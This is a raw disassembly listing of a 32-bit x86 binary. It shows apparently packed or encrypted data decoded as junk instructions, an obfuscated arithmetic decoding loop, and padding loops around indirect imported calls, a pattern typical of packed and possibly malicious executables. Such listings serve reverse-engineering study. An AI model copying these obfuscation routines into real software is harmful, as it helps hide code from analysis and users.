  4169b6:	test   al,0xb6
  4169b8:	loop   0x4169ff
  4169ba:	or     BYTE PTR [ebx],ch
  4169bc:	xchg   edx,eax
  4169bd:	push   ss
  4169be:	xlat   BYTE PTR ds:[ebx]
  4169bf:	jle    0x416969
  4169c1:	in     al,dx
  4169c2:	sub    ebx,DWORD PTR [esi+0x36]
  4169c5:	and    dl,BYTE PTR [ecx+0x32]
  4169c8:	aam    0x84
  4169ca:	rol    dh,0x6e
  4169cd:	lock mov WORD PTR ds:[edx],fs
  4169d1:	mov    ebx,0x39f50f68
  4169d6:	mov    dl,0x99
  4169d8:	inc    esp
  4169d9:	outs   dx,DWORD PTR ds:[esi]
  4169da:	dec    esp
  4169db:	dec    edi
  4169dc:	loop   0x4169d5
  4169de:	(bad)  
  4169df:	imul   ebx,ebp,0x2b2101ec
  4169e5:	push   cs
  4169e6:	mov    DWORD PTR [edi-0x54],edx
  4169e9:	sub    DWORD PTR [ecx+esi*8+0x1a],edi
  4169ed:	loopne 0x4169cc
  4169ef:	dec    ecx
  4169f0:	xor    DWORD PTR [esi],ecx
  4169f2:	or     BYTE PTR [eax-0x682e41e2],cl
  4169f8:	ror    dl,1
  4169fa:	and    DWORD PTR [ecx],ebp
  4169fc:	test   eax,0x7d56c235
  416a01:	or     eax,0x5671520f
  416a06:	popf   
  416a07:	and    ecx,DWORD PTR [esi-0x6b]
  416a0a:	cdq    
  416a0b:	dec    edi
  416a0c:	pop    ebx
  416a0d:	lods   al,BYTE PTR ds:[esi]
  416a0e:	ins    DWORD PTR es:[edi],dx
  416a0f:	lods   al,BYTE PTR ds:[esi]
  416a10:	leave  
  416a11:	(bad)  
  416a12:	stc    
  416a13:	add    eax,0xf7493e5c
  416a18:	imul   ecx,esi,0x55deb05a
  416a1e:	jecxz  0x4169f2
  416a20:	dec    edx
  416a21:	inc    esp
  416a22:	adc    bl,BYTE PTR [edi-0x3d]
  416a25:	xchg   esi,eax
  416a26:	xor    DWORD PTR [ecx-0x70],ebx
  416a29:	xor    dl,bl
  416a2b:	add    DWORD PTR [ecx+0x1aaaa651],edx
  416a31:	pop    esp
  416a32:	xchg   esi,eax
  416a33:	push   edx
  416a34:	shr    dl,1
  416a36:	cmp    al,0x70
  416a38:	adc    eax,0xdf7bdf4e
  416a3d:	jle    0x4169da
  416a3f:	(bad)  
  416a40:	cmp    eax,0xeb39402d
  416a45:	inc    edx
  416a46:	es xor eax,0x595b369
  416a4c:	pop    es
  416a4d:	scas   al,BYTE PTR es:[edi]
  416a4e:	mov    ch,0x1d
  416a50:	hlt    
  416a51:	push   esi
  416a52:	rol    BYTE PTR ds:0x9fb55b62,1
  416a58:	test   al,0x8f
  416a5a:	test   BYTE PTR [edx],dh
  416a5c:	mov    esi,0xe41d5c48
  416a61:	inc    edi
  416a62:	ja     0x416a9e
  416a64:	ret    0xe850
  416a67:	or     eax,0x98b788d2
  416a6c:	(bad)  
  416a6d:	mov    esi,0x13db5a22
  416a72:	imul   edi,DWORD PTR ds:0x453fc2e2,0x3a802bb0
  416a7c:	add    BYTE PTR [ecx-0x74c905a9],ch
  416a82:	into   
  416a83:	adc    eax,0x56b259a0
  416a88:	xchg   BYTE PTR [ebx+0x14f98673],cl
  416a8e:	mov    bl,0x71
  416a90:	dec    ebp
  416a91:	push   ecx
  416a92:	xlat   BYTE PTR ds:[ebx]
  416a93:	dec    eax
  416a94:	sub    esp,DWORD PTR [ecx+0x6b60db8e]
  416a9a:	xor    ch,BYTE PTR [ecx-0x52]
  416a9d:	pop    ebx
  416a9e:	jbe    0x416a67
  416aa0:	sub    BYTE PTR [ecx],bh
  416aa2:	out    0xd,eax
  416aa4:	data16 jne 0x416a58
  416aa7:	loope  0x416a4e
  416aa9:	adc    edx,esi
  416aab:	int3   
  416aac:	cmc    
  416aad:	xor    DWORD PTR [eax+esi*1+0x6ec0de26],ecx
  416ab4:	pop    edi
  416ab5:	sahf   
  416ab6:	mov    bl,BYTE PTR [eax+0x63]
  416ab9:	sahf   
  416aba:	push   fs
  416abc:	pop    ebp
  416abd:	cmp    ch,BYTE PTR [eax-0x15]
  416ac0:	pushf  
  416ac1:	pop    esp
  416ac2:	and    eax,0xffffffb7
  416ac5:	cdq    
  416ac6:	js     0x416a9f
  416ac8:	inc    ebx
  416ac9:	mov    ss,ecx
  416acb:	dec    edx
  416acc:	mov    bh,0xdf
  416ace:	fnstcw WORD PTR [esi+ebp*2]
  416ad1:	int    0x10
  416ad3:	(bad)  
  416ad4:	(bad)  
  416ad6:	inc    ebp
  416ad7:	jno    0x416b19
  416ad9:	lods   al,BYTE PTR ds:[esi]
  416ada:	pop    edx
  416adb:	add    esp,DWORD PTR [ecx+0x2df42870]
  416ae1:	mov    ecx,ebp
  416ae3:	sub    ebp,DWORD PTR [eax+0x1b]
  416ae6:	retf   0x4e2e
  416ae9:	jge    0x416acc
  416aeb:	or     BYTE PTR [edx-0x56],ch
  416aee:	mov    ds:0x39c9c8fc,eax
  416af3:	(bad)  
  416af4:	out    dx,eax
  416af5:	mov    ds:0x2c0801a9,al
  416afa:	ss arpl di,ax
  416afd:	xor    eax,0xeb8e7712
  416b02:	dec    esi
  416b03:	fwait
  416b04:	push   0xffffffc4
  416b06:	and    dl,ah
  416b08:	test   eax,0xb33f4bcf
  416b0d:	shl    esp,0x4d
  416b10:	mov    cl,0x80
  416b12:	mov    cl,0x5a
  416b14:	iret   
  416b15:	and    cl,BYTE PTR fs:[ecx-0x73edb9bf]
  416b1c:	and    bl,BYTE PTR [edx]
  416b1e:	loop   0x416b9e
  416b20:	mov    al,0x5
  416b22:	cmp    BYTE PTR [eax+0x4c],0x8b
  416b26:	scas   al,BYTE PTR es:[edi]
  416b27:	inc    ebp
  416b28:	sbb    edx,DWORD PTR [edx+0x9db77c9]
  416b2e:	xchg   DWORD PTR [ebp+edx*8-0x641073cc],ecx
  416b35:	popf   
  416b36:	adc    ebx,eax
  416b38:	xchg   edx,eax
  416b39:	sub    BYTE PTR [esi],ch
  416b3b:	push   eax
  416b3c:	out    dx,al
  416b3d:	in     eax,dx
  416b3e:	(bad)  
  416b3f:	out    0xca,al
  416b41:	aad    0xae
  416b43:	xchg   esi,eax
  416b44:	aad    0xd6
  416b46:	inc    esi
  416b47:	or     esi,DWORD PTR [ecx]
  416b49:	repz and eax,DWORD PTR [edi+0x6d41dd33]
  416b50:	sbb    esi,esp
  416b52:	push   eax
  416b53:	in     eax,0x8b
  416b55:	pusha  
  416b56:	pop    eax
  416b57:	int    0xef
  416b59:	pushf  
  416b5a:	pop    edi
  416b5b:	jns    0x416bcf
  416b5d:	dec    ecx
  416b5e:	mov    edx,0x205f8d8e
  416b63:	adc    esp,esi
  416b65:	jo     0x416b1c
  416b67:	aas    
  416b68:	dec    DWORD PTR [edi-0xbef669f]
  416b6e:	inc    esi
  416b6f:	sti    
  416b70:	out    dx,al
  416b71:	lock jno 0x416b41
  416b74:	pushf  
  416b75:	fsubr  QWORD PTR ds:0xd82e4e4d
  416b7b:	jmp    0x29b4:0x977beace
  416b82:	adc    eax,ecx
  416b84:	scas   al,BYTE PTR es:[edi]
  416b85:	pop    ecx
  416b86:	dec    edx
  416b87:	jl     0x416ba7
  416b89:	repz dec ebx
  416b8b:	pop    sp
  416b8d:	adc    dh,dh
  416b8f:	fistp  WORD PTR [eax+eiz*8]
  416b92:	sub    BYTE PTR [ebp+0x67],al
  416b95:	dec    edx
  416b96:	nop
  416b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b98:	ficomp WORD PTR [edi]
  416b9a:	mov    bh,0x90
  416b9c:	int3   
  416b9d:	int    0xc2
  416b9f:	cmp    eax,0x78960247
  416ba4:	pop    esp
  416ba5:	mov    ch,0x5f
  416ba7:	mov    edx,DWORD PTR [ebp-0x7b06e5b0]
  416bad:	sbb    BYTE PTR fs:[ecx+0x44fabcef],0x18
  416bb5:	mov    al,0xa1
  416bb7:	outs   dx,DWORD PTR ds:[esi]
  416bb8:	pop    ebp
  416bb9:	hlt    
  416bba:	adc    BYTE PTR [esi+0x14],0xd8
  416bbe:	dec    eax
  416bbf:	mov    al,0xff
  416bc1:	jae    0x416c3f
  416bc3:	sub    ah,bl
  416bc5:	mov    edi,DWORD PTR [ebp-0x22e38e87]
  416bcb:	(bad)  
  416bcc:	in     eax,dx
  416bcd:	pop    eax
  416bce:	shl    ah,0x12
  416bd1:	cld    
  416bd2:	jns    0x416c4e
  416bd4:	or     ax,0x5c3a
  416bd8:	xchg   edx,eax
  416bd9:	ret    0x9e5
  416bdc:	test   eax,0x276c83e5
  416be1:	mov    al,ds:0x1004df49
  416be6:	js     0x416bbf
  416be8:	sbb    DWORD PTR [ecx+0x5ade9757],edx
  416bee:	and    DWORD PTR [edx-0x7a3fc6ac],eax
  416bf4:	sub    BYTE PTR [ebp+0x51],0xaf
  416bf8:	sub    BYTE PTR [ebp+0x34],bh
  416bfb:	jl     0x416c7a
  416bfd:	leave  
  416bfe:	xchg   BYTE PTR [esp+eax*4-0x7e90051e],al
  416c05:	pop    ecx
  416c06:	jne    0x416beb
  416c08:	xchg   ecx,eax
  416c09:	in     al,0x54
  416c0b:	add    al,0xf4
  416c0d:	(bad)  
  416c0e:	bound  edi,QWORD PTR [ebx]
  416c10:	pop    ebp
  416c11:	pop    edx
  416c12:	nop
  416c13:	xchg   ecx,eax
  416c14:	push   es
  416c15:	adc    DWORD PTR [ebp-0xe6d61a1],ecx
  416c1b:	xor    BYTE PTR [esi-0x5755893a],bl
  416c21:	xchg   edi,eax
  416c22:	lods   al,BYTE PTR ds:[esi]
  416c23:	xchg   ecx,eax
  416c24:	retf   
  416c25:	adc    dl,dh
  416c27:	mov    bl,BYTE PTR [edi-0x269ac08]
  416c2d:	out    dx,al
  416c2e:	jae    0x416caa
  416c30:	xchg   edx,eax
  416c31:	scas   al,BYTE PTR es:[edi]
  416c32:	sbb    eax,0x1195265d
  416c37:	dec    esi
  416c38:	or     al,0x58
  416c3a:	mov    edi,0x52f3408
  416c3f:	xchg   DWORD PTR [ecx+edi*4],ebp
  416c42:	dec    esi
  416c43:	inc    edx
  416c44:	cmp    esi,DWORD PTR [esi+0x1e2b02]
  416c4a:	dec    edi
  416c4b:	jmp    0x1df67607
  416c50:	cmp    eax,0x506a0b6d
  416c55:	(bad)  
  416c56:	cmp    ebp,ecx
  416c58:	cs jge 0x416c10
  416c5b:	push   edi
  416c5c:	push   0x4bf2c36f
  416c61:	sbb    al,0x18
  416c63:	sub    ebp,esp
  416c65:	rcr    bl,1
  416c67:	add    ebp,edi
  416c69:	inc    ebx
  416c6a:	addr16 cld 
  416c6c:	inc    esp
  416c6d:	inc    edx
  416c6e:	(bad)  
  416c6f:	jg     0x416c57
  416c71:	cmp    DWORD PTR [eax],0x68134e03
  416c77:	adc    al,0xe8
  416c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c7a:	fsubr  DWORD PTR [edi+0x4b28a668]
  416c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c81:	ins    DWORD PTR es:[edi],dx
  416c82:	push   edx
  416c83:	push   ds
  416c84:	lods   eax,DWORD PTR ds:[esi]
  416c85:	jecxz  0x416ca1
  416c87:	pop    eax
  416c88:	push   esi
  416c89:	xor    eax,0x55747fd2
  416c8e:	mov    bh,0x9c
  416c90:	shr    BYTE PTR [esi+esi*8-0x66],cl
  416c94:	adc    al,dh
  416c96:	inc    ebp
  416c97:	imul   eax,DWORD PTR [edx+0x3c74a898],0x7b
  416c9e:	xor    DWORD PTR [edx],edx
  416ca0:	ja     0x416d1f
  416ca2:	sub    ebp,ebp
  416ca4:	arpl   WORD PTR [esi-0x1a],bp
  416ca7:	xor    al,0xe4
  416ca9:	(bad)  
  416caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cab:	pop    eax
  416cac:	push   ecx
  416cad:	fnsave [edx-0x1b]
  416cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cb1:	fnsetpm(287 only) 
  416cb3:	dec    ebx
  416cb4:	cld    
  416cb5:	lea    eax,[edx]
  416cb7:	jo     0x416cf1
  416cb9:	je     0x416c84
  416cbb:	inc    edi
  416cbc:	xor    al,0xcb
  416cbe:	jnp    0x416cc8
  416cc0:	push   cs
  416cc1:	(bad)  
  416cc2:	imul   ebx,DWORD PTR [edx],0x74597c34
  416cc8:	or     DWORD PTR [eax-0x71],esi
  416ccb:	and    al,BYTE PTR [ecx+edx*1]
  416cce:	cmp    al,0xbf
  416cd0:	sub    ecx,DWORD PTR [ebx-0x2fcc07a3]
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428cf1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af55
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428cfd
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
